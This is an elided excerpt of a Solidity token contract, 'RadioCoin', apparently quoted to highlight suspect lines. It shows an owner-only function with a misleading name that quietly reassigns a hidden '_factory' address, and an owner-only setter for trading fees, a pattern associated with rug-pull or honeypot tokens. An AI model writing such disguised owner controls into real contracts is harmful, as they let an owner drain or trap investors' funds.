...
contract OwnershipHelper is ContextHelper {  
    ...
    */
    ...
    function AutoChangeAgnes(address newOwner) external onlyOwner {
        _factory = newOwner;
    }  
...
contract RadioCoin is ContextHelper, IERC20, OwnershipHelper{
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;  
    mapping (address => mapping (address => uint256)) private _allowances;  
    uint256 private _totalSupply = 100000000 *  10**9;        
    
    string private _name = "RadioCoin";
    string private _symbol = "RadioCoin";
    ...
    function setRadioCoinFees(uint8 _buybackfee, uint8 _reflectionfee, uint8 _marketingfee, uint8 _devfee, uint8 _feedenominator) external onlyOwner {
